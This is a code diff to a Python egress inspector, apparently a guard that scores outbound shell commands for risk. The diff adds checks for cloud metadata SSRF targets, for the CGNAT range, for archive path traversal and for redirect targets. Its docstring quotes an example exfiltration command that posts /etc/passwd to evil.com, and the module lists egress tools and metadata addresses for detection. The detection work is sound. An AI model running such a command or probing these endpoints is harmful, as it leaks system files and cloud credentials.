@@ -10,7 +10,10 @@ catches exfiltration that allowlist-based guards miss (e.g. `curl`
 is allowed, but `curl -d @/etc/passwd https://evil.com` is not).
 """
 
+import ipaddress
 import re
+import tarfile
+import zipfile
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import List, Optional
@@ -110,6 +113,19 @@ _SCP_RE = re.compile(
     r"(?:scp|rsync)\s+.*?\s+(\S+@\S+:\S+)",
 )
 
+# Cloud metadata endpoints — common SSRF targets
+_CLOUD_METADATA_IPS = frozenset({
+    "169.254.169.254",    # AWS, GCP, Azure instance metadata
+    "169.254.170.2",      # AWS ECS task metadata
+    "100.100.100.200",    # Alibaba Cloud metadata
+})
+
+_CLOUD_METADATA_HOSTS = frozenset({
+    "metadata.google.internal",
+    "metadata.goog",
+    "169.254.169.254",
+})
+
 # Commands that send data outbound
 _EGRESS_COMMANDS = frozenset({
     "curl", "wget", "http", "httpie",
@@ -175,7 +191,10 @@ class EgressInspector:
             parsed = urlparse(url)
             host = parsed.hostname or ""
 
-            if host in self.safe_hosts:
+            if host in _CLOUD_METADATA_HOSTS:
+                risk = EgressRisk.CRITICAL
+                reason = "cloud metadata endpoint — SSRF target"
+            elif host in self.safe_hosts:
                 risk = EgressRisk.LOW
                 reason = "known-safe host"
             elif host.endswith((".onion", ".i2p")):
@@ -199,6 +218,33 @@ class EgressInspector:
             if ip.startswith("127.") or ip.startswith("0."):
                 continue
             if ip in self.safe_hosts:
+                continue
+
+            # CGNAT range (100.64.0.0/10) — Python's is_private returns
+            # False for this range, but it's non-routable and often used
+            # for SSRF attacks against cloud infrastructure
+            try:
+                addr = ipaddress.ip_address(ip)
+                cgnat = ipaddress.ip_network("100.64.0.0/10")
+                if addr in cgnat:
+                    risk = EgressRisk.HIGH
+                    reason = "CGNAT range (100.64.0.0/10) — potential SSRF"
+                    verdict.destinations.append(EgressDestination(
+                        raw=match.group(0), dest_type="ip", host=ip,
+                        risk=risk, reason=reason,
+                    ))
+                    continue
+            except ValueError:
+                pass
+
+            # Cloud metadata endpoints — block SSRF to instance metadata
+            if ip in _CLOUD_METADATA_IPS:
+                risk = EgressRisk.CRITICAL
+                reason = "cloud metadata endpoint — SSRF target"
+                verdict.destinations.append(EgressDestination(
+                    raw=match.group(0), dest_type="ip", host=ip,
+                    risk=risk, reason=reason,
+                ))
                 continue
 
             # Private ranges are lower risk (internal)
@@ -299,3 +345,66 @@ class EgressInspector:
             verdict.reason = "Low-risk egress"
 
         verdict.risk_level = max_risk
+
+    # ── Archive traversal detection ──────────────────────────────────
+
+    @staticmethod
+    def check_archive_traversal(archive_path: str) -> list[str]:
+        """Check a tar/zip archive for path traversal attacks (../ entries).
+
+        Returns list of dangerous entry paths found. Empty = safe.
+        Call before extracting any archive from untrusted sources.
+        """
+        dangerous = []
+
+        if archive_path.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tar.xz")):
+            try:
+                with tarfile.open(archive_path, "r:*") as tf:
+                    for member in tf.getmembers():
+                        if ".." in member.name or member.name.startswith("/"):
+                            dangerous.append(member.name)
+                        if member.issym() or member.islnk():
+                            link_target = member.linkname
+                            if ".." in link_target or link_target.startswith("/"):
+                                dangerous.append(f"{member.name} -> {link_target}")
+            except Exception:
+                pass
+
+        elif archive_path.endswith(".zip"):
+            try:
+                with zipfile.ZipFile(archive_path, "r") as zf:
+                    for name in zf.namelist():
+                        if ".." in name or name.startswith("/"):
+                            dangerous.append(name)
+            except Exception:
+                pass
+
+        return dangerous
+
+    @staticmethod
+    def validate_redirect_target(url: str, safe_hosts: Optional[frozenset] = None) -> bool:
+        """Validate a redirect target URL for SSRF safety.
+
+        Returns True if the redirect target is safe. Should be called
+        after each HTTP redirect, not just the initial URL.
+        """
+        hosts = safe_hosts or _SAFE_HOSTS
+        parsed = urlparse(url)
+        host = parsed.hostname or ""
+
+        # Block cloud metadata
+        if host in _CLOUD_METADATA_HOSTS:
+            return False
+
+        # Block CGNAT
+        try:
+            addr = ipaddress.ip_address(host)
+            if addr in ipaddress.ip_network("100.64.0.0/10"):
+                return False
+            if addr.is_loopback or addr.is_link_local:
+                if host not in hosts:
+                    return False
+        except ValueError:
+            pass  # Not an IP — hostname is fine
+
+        return True
